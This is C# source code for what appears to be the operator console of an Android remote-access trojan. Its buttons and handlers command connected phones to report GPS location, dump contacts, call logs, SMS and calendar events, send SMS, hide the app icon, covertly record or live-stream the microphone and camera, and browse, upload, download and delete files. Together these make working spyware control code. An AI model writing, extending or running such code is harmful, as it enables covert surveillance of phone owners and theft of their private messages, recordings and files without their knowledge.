                ctx.VideoReceived += new Action<byte[]>(OnFrame);
                ctx.FilesReceived += new Action<List<Class1.FileData>>(OnFiles);
                ctx.FileOperationResult += new Action<Class1.FileOperation>(FileOpResult);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Android UI Load\r\nError: " + ex.Message);
            }
        }

        /// <summary>
        /// Starts the dismissing thread for the notify label
        /// </summary>
        private void LabelDismiss()
        {
            Task.Factory.StartNew(new Action(() => DismissThread())); //Start the new thread
        }

        /// <summary>
        /// Hide the notify label
        /// </summary>
        private void DismissThread()
        {
            Thread.Sleep(5000); //Wait a bit
            label2.Invoke(new Action(() => label2.Visible = false)); //Hide the label
        }

        /// <summary>
        /// Get the camera facing option
        /// </summary>
        /// <param name="functionTitle">The function which the facing will be supplied to</param>
        /// <returns>The camera facing, null if invalid value supplied</returns>

        private string GetCameraFacing(string functionTitle)
        {
            //Get facing option
            sCore.IO.Types.InputBoxValue ibv = ServerSettings.ShowInputBox(functionTitle, "Do you want to use the \"front\" ot the \"back\" camera", ctx.pluginToken);
            if (ibv.dialogResult != DialogResult.OK) return null; //If dialog cancelled
            string opt = ibv.result.ToLower(); //Convert result to lower case chars
            if (opt != "front" && opt != "back") return null; //Filter valid results
            return opt; //Return valid result
        }

        /// <summary>
        /// Get the video stream delay option
        /// </summary>
        /// <returns>Video stream delay, null if invalid valwue supplied</returns>

        private string GetTapDelay()
        {
            //Get the delay value
            sCore.IO.Types.InputBoxValue ibv = ServerSettings.ShowInputBox("Image Send Delay", "Type in a delay in seconds, decimal point allowed", ctx.pluginToken);
            if (ibv.dialogResult != DialogResult.OK) return null; //If dialog cancelled
            string opt = ibv.result.ToLower(); //Convert result to lower case
            if (!float.TryParse(opt, out float test) && !int.TryParse(opt, out int test2)) return null; //if invalid float & invalid int
            opt = opt.Replace(System.Globalization.NumberFormatInfo.CurrentInfo.NumberDecimalSeparator, "."); //replace the decimal separator with "."
            test *= 1000; //convert the seconds to milliseconds
            videoStreamDelay = (int)Math.Round(test); //Do a math.round, in case the result is still a float, set the delay value
            return opt; //return the delay value
        }

        /// <summary>
        /// Get video stream quality
        /// </summary>
        /// <returns>A quality between 0 and 100, null if invalid valu supplied</returns>

        private string GetTapQuality()
        {
            //Get the quality
            sCore.IO.Types.InputBoxValue ibv = ServerSettings.ShowInputBox("Image Quality", "Type in the quality of the image (0-100)", ctx.pluginToken);
            if (ibv.dialogResult != DialogResult.OK) return null; //if dialog cancelled
            string opt = ibv.result.ToLower(); //Convert to lower case
            bool validInput = int.TryParse(opt, out int result);  //Try to convert input to int
            if (!validInput || result < 0 || result > 100) return null; //if invalid input or quality out of range
            return opt; //return the quality
        }

        /// <summary>
        /// Reset the context.expectVideo value
        /// </summary>

        private void ResetExpectVideo()
        {
            Thread.Sleep(videoStreamDelay + 5000); //Sleep for the send delay + 5 seconds
            ctx.expectVideo = false; //reset the value
        }

        #region Event Handlers

        /// <summary>
        /// FileOperatioResult Event handle
        /// </summary>
        /// <param name="opResult">The operation result</param>
        private void FileOpResult(Class1.FileOperation opResult)
        {
            //Display result
            MessageBox.Show(opResult.message, opResult.name, MessageBoxButtons.OK, (opResult.success) ? MessageBoxIcon.Information : MessageBoxIcon.Warning);
        }

        /// <summary>
        /// File listing event handler
        /// </summary>
        /// <param name="fileList">The list of file data</param>
        private void OnFiles(List<Class1.FileData> fileList)
        {
            //Clear file list view
            listView4.Items.Clear();

            //Loop through files
            foreach (Class1.FileData file in fileList)
            {
                //Create file list view item
                ListViewItem lvi = new ListViewItem()
                {
                    Text = file.name
                };
                lvi.SubItems.Add(file.size.ToString());
                lvi.SubItems.Add(file.path);
                lvi.Tag = file.isDir;

                //Add item to the listView
                listView4.Items.Add(lvi);
            }
        }

        /// <summary>
        /// Video frame event handler
        /// </summary>
        /// <param name="videoFrame">The video frame byte array</param>
        private void OnFrame(byte[] videoFrame)
        {
            if (img == null) return; //Check if we have an imageView form
            try
            {
                Image frame = (Bitmap)((new ImageConverter()).ConvertFrom(videoFrame)); //Convert byte array to image object
                HandleLocalCallbacks("getNextFrame", frame); //Handle local callback to bridge functions
                img.UpdateImage(frame); //Update the image on the imageView Form
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to convert bytes to image: " + ex.ToString());
            }
        }

        /// <summary>
        /// Photo received event handler
        /// </summary>
        /// <param name="jpegBytes">The jpeg image bytes array</param>
        private void OnPhoto(byte[] jpegBytes)
        {
            Image photo = (Bitmap)((new ImageConverter()).ConvertFrom(jpegBytes)); //Convert byte array to image object
            HandleLocalCallbacks("takePhoto", photo); //Handle local callback to bridge functions
            if (img != null) img.Close(); //Close the imageView if it's opened
            img = new ImageView(); //Create a new imeageView
            img.Show(); //Open the imageView
            img.UpdateImage(photo); //Update the image
        }

        /// <summary>
        /// List calendar events event handler
        /// </summary>
        /// <param name="events">List of calendar events</param>
        private void OnEventList(List<Class1.EventData> events)
        {
            //Handle local callbacks to bridge functions
            HandleLocalCallbacks("getCalendarEvents", events);

            //Clear the calendar listView
            listView3.Items.Clear();

            foreach (Class1.EventData e in events)
            {
                //Create calendar listView items
                ListViewItem lvi = new ListViewItem()
                {
                    Tag = e,
                    Text = e.id
                };
                lvi.SubItems.Add(e.name);
                //Add the listView item to the listView
                listView3.Items.Add(lvi);
            }
        }

        /// <summary>
        /// Sms Messages event handler
        /// </summary>
        /// <param name="messages">List of sms messages</param>
        private void OnSmsList(List<Class1.SmsData> messages)
        {
            //Handle local callbacks to bridge functions
            HandleLocalCallbacks("getSmsMessages", messages);

            if (smsDisplay != null) //Close sms display if it's open
            {
                smsDisplay.Close();
                smsDisplay.Dispose();
                smsDisplay = null;
            }
            smsDisplay = new SmsView(messages); //Create a new SmsView
            smsDisplay.Show(); //Display the smsView
        }

        /// <summary>
        /// List call log event handler
        /// </summary>
        /// <param name="callData">List of call data</param>
        private void OnCallLogList(List<Class1.CallData> callData)
        {
            //Handle local callback to bridge functions

            HandleLocalCallbacks("getCallLog", callData);

            //Clear the call log list view
            if (listView2.Items.Count > 0) listView2.Items.Clear();

            //Loop through the call log
            foreach (Class1.CallData cd in callData)
            {
                //Create call log listView item
                ListViewItem lvi = new ListViewItem()
                {
                    Text = cd.phoneNumber
                };
                lvi.SubItems.Add(cd.callType);
                lvi.SubItems.Add(cd.callDuration.ToString());
                lvi.SubItems.Add(cd.callDate);
                //Add listViewItem to the listView
                listView2.Items.Add(lvi);
            }
        }

        /// <summary>
        /// Contact list Event handler
        /// </summary>
        /// <param name="contactList">List of contacts</param>
        private void OnContactsList(Dictionary<String, String> contactList)
        {
            //Handle the local callback to bridge functions

            HandleLocalCallbacks("getContacts", contactList);

            //Clear the contacts listview
            listView1.Items.Clear();

            //Loop through the contacts
            foreach (KeyValuePair<String, String> kvp in contactList)
            {
                //Create the listView item for contact
                ListViewItem lvi = new ListViewItem()
                {
                    Text = kvp.Key
                };
                lvi.SubItems.Add(kvp.Value);
                //Add listViewItem to listView
                listView1.Items.Add(lvi);
            }
        }

        /// <summary>
        /// New Connection event handler
        /// </summary>
        /// <param name="clientName">The name of the new client</param>
        private void OnNewClient(string clientName)
        {
            comboBox1.Items.Add(clientName); //add the client name to the combobox
        }

        /// <summary>
        /// Disconnect Event Handler
        /// </summary>
        /// <param name="clientName">The name of the disconnected client</param>
        private void OnClientDisconnected(string clientName)
        {
            if (comboBox1.SelectedItem.ToString() == clientName) //If current client disconnected, notify user
            {
                label2.Visible = true;
                comboBox1.Text = "";
                comboBox1.SelectedItem = null;
            }
            comboBox1.Items.Remove(clientName); //Remove client from the Combobox
            LabelDismiss(); //Start dismissing the label
        }

        #endregion

        #region Control Events

        #pragma warning disable IDE1006

        /// <summary>
        /// Test Connection Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button1_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("test");
        }

        /// <summary>
        /// Change the controlled client
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBox1.SelectedItem != null) //If combobox has a selected item
            {
                ctx.SetCurrentClient(comboBox1.SelectedIndex); //Set the current client
            }
        }

        /// <summary>
        /// Get Location Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button2_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("gps");
        }

        /// <summary>
        /// Get Battery Information Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button3_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("battery");
        }

        /// <summary>
        /// Get Contacts Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button4_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("contacts");
        }

        /// <summary>
        /// Get contact details tool strip item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void getContactDetailsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 0) return; //if no selected contact return

            string id = listView1.SelectedItems[0].SubItems[0].Text; //Get the id of the selected contact

            ctx.SendCommand("contact|" + id); //Send command
        }

        /// <summary>
        /// Add contact tool strip item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void addContactToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AddContact acDialog = new AddContact(ctx); //Create new addContact dialog
            acDialog.ShowDialog(); //Show the dialog
        }

        /// <summary>
        /// Get Call Log Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button5_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("calllog");
        }

        /// <summary>
        /// Get SMS Messages Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button6_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("sms");
        }

        /// <summary>
        /// Send SMS Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button7_Click(object sender, EventArgs e)
        {
            //Get recipient phone number
            sCore.IO.Types.InputBoxValue ibv = ServerSettings.ShowInputBox("Send SMS", "Please type in the phone number of the recipient!", ctx.pluginToken);
            if (ibv.dialogResult != DialogResult.OK) return; //if dialog cancelled return
            string phoneNumber = ibv.result;
            //Get the message
            ibv = ServerSettings.ShowInputBox("Send SMS", "Please type in the message you wish to send!", ctx.pluginToken);
            if (ibv.dialogResult != DialogResult.OK) return; //if dialog cancelled return
            string message = ibv.result;

            string command = "send-sms|" + phoneNumber + "|" + message.Replace("|", string.Empty); //Construct command
            ctx.SendCommand(command); //Send Command
            MessageBox.Show("SMS Message Sent", "Send SMS", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        /// <summary>
        /// Hide App Icon Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button8_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("self-hide");
        }

        /// <summary>
        /// Show Application Icon Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button9_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("self-show");
        }

        /// <summary>
        /// List Calendar Events Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button10_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("calendar");
        }

        /// <summary>
        /// Add calendar event button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void addEventToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AddEvent eventUI = new AddEvent(ctx, AddEvent.MODE_ADD); //Create new AddEvent dialog
            eventUI.Show(); //Show the form
        }

        /// <summary>
        /// Display Event Details tool strip item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count == 1)
            {
                string displayText = "";
                Class1.EventData edata = (Class1.EventData)listView3.SelectedItems[0].Tag;
                displayText = "Description: " + edata.description + Environment.NewLine +
                    "Location: " + edata.location + Environment.NewLine +
                    "Starting Time: " + edata.startTime + Environment.NewLine +
                    "Ending Time: " + edata.endTime;

                MessageBox.Show(displayText, "Event Data", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        /// <summary>
        /// Modify Event Tool Strip item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void changeEventToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count == 1) //If event selected
            {
                Class1.EventData edata = (Class1.EventData)listView3.SelectedItems[0].Tag; //Get the event data
                AddEvent eventUI = new AddEvent(ctx, AddEvent.MODE_EDIT); //Create new AddEvent Dialog
                eventUI.Show(); //Show the form
                eventUI.LoadEvent(edata); //Load the event data to the form
            }
        }

        /// <summary>
        /// Delete event tool strip item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void deleteEventToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count == 1) //If event selected
            {
                Class1.EventData edata = (Class1.EventData)listView3.SelectedItems[0].Tag; //Get the event data
                string command = "delete-calendar|" + edata.id; //Send command
            }
        }
        
        /// <summary>
        /// Start recording mic Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button11_Click(object sender, EventArgs e)
        {
            if (button11.Text.StartsWith("Start")) //If not recording
            {
                ctx.SendCommand("mic-record-start"); //Send command
                button11.Text = "Stop Recording Mic"; //Change state
                button12.Enabled = false; //prevent mic streaming
                return;
            }
            
            if (button11.Text.StartsWith("Stop")) //If recording
            {
                ctx.SendCommand("mic-record-stop"); //Send command
                button11.Text = "Start Recording Mic"; //Change state
                button12.Enabled = true; //Allow mic streaming
            }
        }

        /// <summary>
        /// Start Mic Stream Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button12_Click(object sender, EventArgs e)
        {
            if (button12.Text.StartsWith("Start")) //Stream not started
            {
                ctx.InitAudioStream(); //Init playback on context
                button12.Text = "Stop Tapping Mic"; //Change state
                ctx.SendCommand("mic-tap-start"); //Send command
                button11.Enabled = false; //Prevent mic recording
                return;
            }

            if (button12.Text.StartsWith("Stop")) //Stream started
            {
                ctx.SendCommand("mic-tap-stop"); //Send command
                Thread.Sleep(3000); //Wait for client to stop stream
                ctx.DestroyAudioStream(); //Dispose playback on context
                button11.Enabled = true; //Allow mic recording
                button12.Text = "Start Tapping Mic"; //Change State
            }
        }
        
        /// <summary>
        /// Take a photo button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button13_Click(object sender, EventArgs e)
        {
            //Get the cam facing option
            string opt = GetCameraFacing("Take a photo");
            if (opt == null) return;
            //Set context to expect photo
            ctx.expectPhoto = true;
            //Send Command
            ctx.SendCommand("cam-photo|" + opt);
        }

        /// <summary>
        /// Record Video Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button14_Click(object sender, EventArgs e)
        {
            if (button14.Text.StartsWith("Start")) //Not recording
            {
                //Get cam facing
                string opt = GetCameraFacing("Record Video");
                if (opt == null) return;
                button13.Enabled = false; //Prevent photo
                button15.Enabled = false; //Prevent video stream
                ctx.SendCommand("cam-record-start|" + opt); //Send command
                button14.Text = "Stop Recording Cam"; //Change state
                return;
            }

            if (button14.Text.StartsWith("Stop")) //Recording
            {
                ctx.SendCommand("cam-record-stop"); //Send Command
                button13.Enabled = true; //Allow photo
                button15.Enabled = true; //Allow Video Stream
                button14.Text = "Start Recording Cam"; //Change State
            }
        }

        /// <summary>
        /// Video Stream Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button15_Click(object sender, EventArgs e)
        {
            if (button15.Text.StartsWith("Start")) //Not Streaming
            {
                //Get cam facing
                string opt = GetCameraFacing("Tap Camera");
                if (opt == null) return;
                //Get frame quality
                string opt2 = GetTapQuality();
                if (opt2 == null) return;
                //Get send delay
                string opt3 = GetTapDelay();
                if (opt3 == null) return;
                ctx.expectVideo = true; //Context expect video frames
                button13.Enabled = false; //Prevent photo
                button14.Enabled = false; //Prevent video recording
                if (img != null) img.Close(); //If imageView open then close it
                img = new ImageView(true); //Stream Mode = true (auto rotate new images)
                img.Show(); //Display imageView
                ctx.SendCommand("cam-tap-start|" + opt + "|" + opt2 + "|" + opt3); //Send command
                button15.Text = "Stop Tapping Cam"; //Change State
                return;
            }

            if (button15.Text.StartsWith("Stop")) //Streaming
            {
                ctx.SendCommand("cam-tap-stop"); //Send Command
                Thread t = new Thread(new ThreadStart(ResetExpectVideo)); //Create context expectation reset thread
                t.Start(); //Start that thread
                if (img != null) img.Close(); //close imageView
                img.Dispose(); //Dispose imageView
                img = null; //set imageView to null
                button13.Enabled = true; //Allow taking photo
                button14.Enabled = true; //Allow recording video
                button15.Text = "Start Tapping Cam"; //Change State
            }
        }

        /// <summary>
        /// List Files Tool Strip Item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listFilesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("flist"); //Send Command
            currentDir = "/"; //Set current dir
        }

        /// <summary>
        /// Enter Directory Tool Strip Item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void enterDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Get the selected file
            string dir = GetSelectedFile();
            if (dir == null) return;
            ctx.SendCommand("flist|" + dir); //Send command
            currentDir = dir; //Update current dir
        }

        /// <summary>
        /// Get the selected file in the file browser listView
        /// </summary>
        /// <returns>The selected file's full path, null if nothing is selected</returns>
        private string GetSelectedFile()
        {
            if (listView4.SelectedItems.Count == 1)
            {
                return listView4.SelectedItems[0].SubItems[2].Text;
            }

            return null;
        }

        /// <summary>
        /// Move File Tool Strip Item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void moveFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Get the selected file
            string file = GetSelectedFile();
            if (file == null) return;
            ctx.SendCommand("fmove|" + file); //Send Command
        }

        /// <summary>
        /// Copy File Tool Strip Item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void copyFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Get selected file
            string file = GetSelectedFile();
            if (file == null) return;
            ctx.SendCommand("fcopy|" + file); //Send Command
        }

        /// <summary>
        /// Paste File Tool Strip Item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void pasteFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ctx.SendCommand("fpaste|" + currentDir);
        }

        /// <summary>
        /// Delete file tool strip item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void deleteFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Get selected file
            string file = GetSelectedFile();
            if (file == null) return;
            ctx.SendCommand("fdel|" + file); //Send Command
        }

        /// <summary>
        /// Rename File Tool Strip Item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void renameFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Get selected file
            string file = GetSelectedFile();
            if (file == null) return;
            //Get the new name for the file
            sCore.IO.Types.InputBoxValue ibv = ServerSettings.ShowInputBox("Rename File", "Type in the new desired name for the file", ctx.pluginToken);
            if (ibv.dialogResult != DialogResult.OK) return; //if dialog cancelled
            string name = ibv.result;
            ctx.SendCommand("frename|" + file + "|" + name); //Send command
        }

        /// <summary>
        /// Download file tool strip item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void downloadFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Get selected file
            string file = GetSelectedFile();
            if (file == null) return;
            //Get download location
            SaveFileDialog sfd = new SaveFileDialog()
            {
                Title = "Select where you want to save the downloaded file"
            };
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                ctx.dlFilePath = sfd.FileName;
            }
            else return;
            ctx.SendCommand("fdownload|" + file); //Send command
        }

        /// <summary>
        /// Upload File Tool Strip Item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void uploadFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Select file to upload
            OpenFileDialog ofd = new OpenFileDialog()
            {
                Title = "Please select a location for the file"
            };
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                string file = ofd.FileName;
                long length = new System.IO.FileInfo(file).Length; //Get file size in bytes
                ctx.ulFilePath = file; //Set context upload file path
                ctx.SendCommand("fupload|" + currentDir + "/" + new System.IO.FileInfo(file).Name + "|" + length); //Send command
            }
        }

        /// <summary>
        /// Up 1 Tool Strip Item
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (currentDir.IndexOf('/') == currentDir.LastIndexOf('/')) ctx.SendCommand("flist"); //up1 is root -> /
            else if (currentDir == "/") return; //up1 is nothing because we are on the top
            else //need to calcualte up1
            {
                currentDir = currentDir.Substring(0, currentDir.LastIndexOf('/')); //Set the new current dir, calculate the parent directory
                ctx.SendCommand("flist|" + currentDir); //Send command
            }
        }

    #endregion

#endregion
    }
}
